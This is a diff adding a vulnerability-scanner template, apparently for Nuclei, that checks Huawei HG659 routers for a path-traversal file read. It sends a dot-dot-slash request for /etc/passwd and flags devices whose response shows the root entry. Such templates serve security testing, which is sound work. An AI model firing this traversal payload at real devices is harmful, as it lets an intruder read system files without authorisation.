@@ -1,0 +1,21 @@
+id: yaml-poc-huawei-hg659-readfile-CT-194257
+info:
+  name: Yaml Poc Huawei Hg659 Readfile Ct 194257
+  author: converted
+  severity: medium
+  description: 'Converted from xpoc: yaml-poc-huawei-hg659-readfile-CT-194257'
+  tags: lfi
+  reference: []
+http:
+- method: GET
+  path:
+  - /lib///....//....//....//....//....//....//....//....//etc//passwd
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: regex
+    part: body
+    regex:
+    - 'root:[x*]:0:0:'
